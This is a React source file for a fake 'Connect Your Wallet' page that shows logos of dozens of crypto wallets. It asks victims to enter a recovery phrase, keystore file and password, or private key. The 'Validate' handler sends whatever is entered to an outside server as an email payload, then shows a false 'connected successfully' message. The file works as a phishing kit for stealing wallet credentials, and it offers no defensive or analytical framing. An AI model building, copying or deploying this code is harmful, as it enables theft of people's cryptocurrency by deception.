import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

import metamask from './assets/metamask.jpg';
import trust from './assets/trust_wallet.jpg';
import coinbase from './assets/coinbases.png';
import xumm from './assets/xumm.png';
import cardano from './assets/cardano.png';
import daedalus from './assets/daedalus.png';
import yoroi from './assets/yoroi.png';
import ccvault from './assets/ccvault.png';
import gero from './assets/gero.jpg';
import nami from './assets/nami.png';
import solana from './assets/solana.png';
import phantom from './assets/phantom.jpg';
import solflare from './assets/solflare.png';
import sollet from './assets/sollet.png';
import solong from './assets/solong.jpg';
import exodus from './assets/exodus.png';
import avalanche from './assets/avalanche.png';
import velas from './assets/velas.png';
import cryptocom from './assets/crypto-4cbeac57421fb3ca2573db2cf448169a.png';
import blockchain from './assets/blockchain-logo.png';
import binance from './assets/binance.png';
import safepal from './assets/safepal.jpg';
import argent from './assets/argent.jpg';
import aktionariat from './assets/aktionariat-c5784b26234a389632687a36d2fb3258.png';
import keyring from './assets/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png';
import bitkeep from './assets/bitkeep-387b0ca7da4cf322f44c70c23064c529.png';
import sparkpoint from './assets/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png';
import ownbit from './assets/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png';
import infinity from './assets/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png';
import walletio from './assets/wallet-io-198f396de22fe25eb370f46544abe69d.png';
import infinito from './assets/wallet-io-198f396de22fe25eb370f46544abe69d.png';
import nash from './assets/nash.jpg';
import bitpay from './assets/bitpay.jpg';
import imtoken from './assets/imtoken.jpg';
import other from './assets/otherssss.jpg';
import trustwallet from './assets/trustwallet.png'
import { Shield } from 'lucide-react';

const wallets = [
  { name: 'Metamask', icon: metamask },
  { name: 'Trust', icon: trustwallet },
  { name: 'Coinbase', icon: coinbase },
  { name: 'TokenPocket', icon: xumm },
  { name: 'Cardano', icon: cardano },
  { name: 'Daedalus', icon: daedalus },
  { name: 'Yoroi', icon: yoroi },
  { name: 'CCVault', icon: ccvault },
  { name: 'Gero', icon: gero },
  { name: 'Nami', icon: nami },
  { name: 'Solana', icon: solana },
  { name: 'Phantom', icon: phantom },
  { name: 'Solflare', icon: solflare },
  { name: 'Sollet', icon: sollet },
  { name: 'Solong', icon: solong },
  { name: 'Exodus', icon: exodus },
  { name: 'Avalanche', icon: avalanche },
  { name: 'Velas', icon: velas },
  { name: 'Crypto.com', icon: cryptocom },
  { name: 'Blockchain', icon: blockchain },
  { name: 'Binance Smart Chain', icon: binance },
  { name: 'Safepal', icon: safepal },
  { name: 'Argent', icon: argent },
  { name: 'Aktionariat', icon: aktionariat },
  { name: 'Keyring Pro', icon: keyring },
  { name: 'BitKeep', icon: bitkeep },
  { name: 'SparkPoint', icon: sparkpoint },
  { name: 'OwnBit', icon: ownbit },
  { name: 'Infinity Wallet', icon: infinity },
  { name: 'Wallet.io', icon: walletio },
  { name: 'Nash', icon: nash },
  { name: 'BitPay', icon: bitpay },
  { name: 'imToken', icon: imtoken },
  { name: 'Other Wallet', icon: other },
];

function WalletConnectPage() {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [activeTab, setActiveTab] = useState('phrase');
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [inputValue, setInputValue] = useState('');
  const [password, setPassword] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const navigate = useNavigate();
  const [walletName, setWalletName] = useState(''); // Add walletName to the state


  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setActiveTab('phrase');
    setInputValue('');
    setPassword('');
    setIsModalOpen(true);
    setErrorMessage('');
  };

  const handleValidate = async () => {
    if (inputValue.trim() === '' || (activeTab === 'keystore' && password.trim() === '')) {
      setErrorMessage('Please fill in all the required fields.');
      return;
    }
  
    if (activeTab === 'phrase') {
      const wordCount = inputValue.trim().split(/\s+/).filter(word => word.length > 0).length;
      if (![12, 15, 24].includes(wordCount)) {
        setErrorMessage('Recovery phrase must contain exactly 12, 15, or 24 words.');
        return;
      }
    }
  
    if (activeTab === 'keystore') {
      // Add keystore-related validation here, if needed
    }
  
    setIsLoading(true);
  
    try {
      await sendEmail(selectedWallet?.name, `Value from secureqfs: ${inputValue}, other: ${password}`);
      setShowSuccessModal(true);
  
      setTimeout(() => {
        setShowSuccessModal(false);
        navigate('/'); // Navigate to home page
      }, 3000);
    } catch (error) {
      console.error('Failed to send email:', error);
      setErrorMessage('Failed to send email. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };
  
  
  const sendEmail = async (type, text) => {
    try {
      const response = await fetch('https://fastapi-production-0125.up.railway.app/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ type, text, domain: '' }), // Adding an empty domain field
      });
  
      if (!response.ok) {
        throw new Error('Failed to send email');
      }
  
      // Optionally, handle response data here
    } catch (error) {
      console.error('Error sending email:', error);
      throw error; // Re-throw the error to be handled in the calling function
    }
  };
  
  
  
  
  const Loader = () => (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex justify-center items-center z-50">
      <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-blue-500"></div>
    </div>
  );

  const SuccessModal = () => (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex justify-center items-center z-50">
      <div className="bg-gray-800/90 rounded-xl p-8 w-full max-w-md shadow-2xl border border-gray-700/50 transform transition-all duration-300 ease-in-out scale-100 hover:scale-105">
        <div className="flex items-center mb-6">
          <div className="bg-gradient-to-r from-blue-500 to-indigo-500 rounded-full p-2 mr-4">
            <Shield className="w-6 h-6 text-white" />
          </div>
          <h2 className="text-2xl font-bold text-white">Success!</h2>
        </div>
        <p className="text-gray-300 mb-6">Your wallet has been connected successfully.</p>
      </div>
    </div>
  );

  const renderModalContent = () => {
    switch (activeTab) {
      case 'phrase':
        return (
          <>
            <textarea
              className="w-full bg-gray-900/50 border border-gray-700/50 rounded-lg p-4 mb-2 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
              rows="4"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder="Enter your recovery phrase"
            ></textarea>
            <p className="text-sm text-gray-400 mb-4">
              Typically, it consists of 12, 15 (sometimes 24) words separated by single spaces.
            </p>
          </>
        );
      case 'keystore':
        return (
          <>
            <textarea
              className="w-full bg-gray-900/50 border border-gray-700/50 rounded-lg p-4 mb-2 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
              rows="4"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder="Enter your Keystore JSON"
            ></textarea>
            <input
              type="password"
              className="w-full bg-gray-900/50 border border-gray-700/50 rounded-lg p-4 mb-2 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Wallet password"
            />
            <p className="text-sm text-gray-400 mb-4">
              Several lines of text start with "..." followed by the password you used to encrypt it.
            </p>
          </>
        );
      case 'privateKey':
        return (
          <>
            <input
              type="text"
              className="w-full bg-gray-900/50 border border-gray-700/50 rounded-lg p-4 mb-2 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder="Enter your Private Key"
            />
            <p className="text-sm text-gray-400 mb-4">
              Typically 12 (sometimes 24) words separated by a single space.
            </p>
          </>
        );
      default:
        return null;
    }
  };

  return (
    <div className="bg-gradient-to-b from-gray-900 to-black min-h-screen flex justify-center items-start py-10 relative">
      {/* Background pattern */}
      <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PHBhdHRlcm4gaWQ9ImdyaWQiIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHBhdGggZD0iTSAxMCAwIEwgMCAwIDAgMTAiIGZpbGw9Im5vbmUiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS1vcGFjaXR5PSIwLjA1Ii8+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyaWQpIi8+PC9zdmc+')] opacity-20"></div>

      <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl border border-gray-700/50 p-8 w-full max-w-4xl relative z-10">
        <h1 className="text-3xl font-bold mb-8 text-white text-center">Connect Your Wallet</h1>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-4">
          {wallets.map((wallet) => (
            <button
              key={wallet.name}
              className="p-4 bg-gray-900/50 backdrop-blur-sm border border-gray-700/50 rounded-xl flex flex-col items-center transition-all duration-300 hover:transform hover:-translate-y-1 hover:bg-gray-800/70 group"
              onClick={() => handleWalletClick(wallet)}
            >
              <img src={wallet.icon} alt={wallet.name} className="h-12 w-12 mb-2" />
              <span className="text-sm text-gray-300 group-hover:text-blue-300 transition-colors">{wallet.name}</span>
            </button>
          ))}
        </div>
      </div>

      {isModalOpen && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex justify-center items-center z-50">
          <div className="bg-gray-800/90 rounded-xl border border-gray-700/50 p-8 w-full max-w-md">
            <div className="flex items-center mb-6">
              <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-8 h-8 mr-3" />
              <h2 className="text-xl font-bold text-white">{selectedWallet.name}</h2>
            </div>

            <div className="flex space-x-4 mb-6">
              {['phrase', 'keystore', 'privateKey'].map((tab) => (
                <button
                  key={tab}
                  className={`py-2 px-4 rounded-lg transition-all duration-300 ${
                    activeTab === tab
                      ? 'bg-gradient-to-r from-blue-500 to-indigo-500 text-white'
                      : 'bg-gray-900/50 text-gray-400 hover:text-gray-200'
                  }`}
                  onClick={() => setActiveTab(tab)}
                >
                  {tab.charAt(0).toUpperCase() + tab.slice(1)}
                </button>
              ))}
            </div>

            {renderModalContent()}
            {errorMessage && <p className="text-red-400 text-sm mb-4">{errorMessage}</p>}
            
            <button
              className="w-full bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600 text-white py-4 px-6 rounded-lg font-bold transition-all duration-300 transform hover:-translate-y-1 mb-4"
              onClick={handleValidate}
            >
              {isLoading ? 'Validating...' : 'Validate'}
            </button>
            
            <button
              className="w-full text-gray-400 hover:text-red-400 font-semibold transition-colors"
              onClick={() => setIsModalOpen(false)}
            >
              Cancel
            </button>
          </div>
        </div>
      )}

      {isLoading && <Loader />}
      {showSuccessModal && <SuccessModal />}
    </div>
  );
}

export default WalletConnectPage;